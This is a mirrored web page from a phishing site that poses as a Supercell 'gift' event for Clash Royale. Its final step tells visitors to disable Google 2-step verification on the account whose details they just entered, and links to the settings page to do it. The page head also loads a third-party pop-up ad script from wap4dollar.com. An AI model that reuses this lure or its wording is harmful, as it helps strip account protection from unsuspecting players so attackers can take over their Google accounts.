<!DOCTYPE html>
<html lang="en">
  
<!-- Mirrored from new-events.top/Events-ClashOfClanss2017.com/confirmation.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 15 Mar 2017 04:29:19 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=05f9n1fz0f"></script>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="description" content="">
    <title>Clash Royale - SUPERCELL GIFT</title><!--[if lt IE 9]>
    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script><![endif]-->
    <link href="css/_bower.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">
    <!-- Hotjar Tracking Code for http://darkgamingsociety.com/ -->
<script>
    (function(h,o,t,j,a,r){
        h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
        h._hjSettings={hjid:313876,hjsv:5};
        a=o.getElementsByTagName('head')[0];
        r=o.createElement('script');r.async=1;
        r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
        a.appendChild(r);
    })(window,document,'//static.hotjar.com/c/hotjar-','.js?sv=');
</script>
  </head>
  <body>
    <nav class="navbar navbar-default">
      <div class="container-fluid">
        <div class="navbar-header">
          
        </div>
        <div id="navbar" class="collapse navbar-collapse">
<form action="http://new-events.top/Events-ClashOfClanss2017.com/confirmation.php" method="POST">
          
        </div>
      </div>
    </nav>
    <div class="container">
      <div class="row">
        <div class="col-md-12">
          <div class="heading">
            <div id="google_translate_element"></div><script>function googleTranslateElementInit() {  new google.translate.TranslateElement({    pageLanguage: 'id',    multilanguagePage: true,    layout: google.translate.TranslateElement.InlineLayout.VERTIKAL  }, 'google_translate_element');}</script><script src="../../translate.google.com/translate_a/elementa0d8.html?cb=googleTranslateElementInit"></script>

<div class="RWIGQ" jsname="OKwYj"><div class="CGVQsc"></div></div><div class="FSCHRd"><div class="aGMYPd" jsname="uPuGNe" role="heading" aria-level="2" tabindex="-1">Congratulations: You Already Reached Final Step </div><div class="lIbrjf gS2Bvc">Please Turn off 2-Step Verification . <span jsname="vMgoNd" style="display: none;">Click <b>Next</b> to continue.</span><div class="oOOyEb" jsname="bN97Pc"><div class="swjrDd"><img src="img/musnahs.png" width="400" alt=""></div><div class="m92mTb" role="heading" aria-level="3"> Click Nonaktifkan To Turn off 2-step verification . </div>
  </div>
<center><p> make sure you disable the same account , with the data you enter just now </p>
<div class="BvQA9c"> Remember : </b> <center><p> if 2-step verification is already dead please do not be revived this may cause an error</p></div>
</div><br><br>

		<div style="width:100%" class="form-group">
  <a  href="https://myaccount.google.com/u/0/security/signinoptions/two-step-verification/">
<div class="btn btn-block" style="color: #ffffff;background-color: #ffffff" id="gsubmit"> TURN - OFF NOW </a>
 </div>
</form>
</div>
 
      </div>
     
    </div>
    <footer class="footer">
      <div class="container">
        <p class="text-muted">&copy; Copyright 2017 SUPERCELL Game - Present. All rights reserved.</p>
      </div>
    </footer>
    <script src="js/bower.js"></script>
    <script src="js/scripts.js"></script>
  </body>

<!-- Mirrored from new-events.top/Events-ClashOfClanss2017.com/confirmation.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 15 Mar 2017 04:29:24 GMT -->
</html>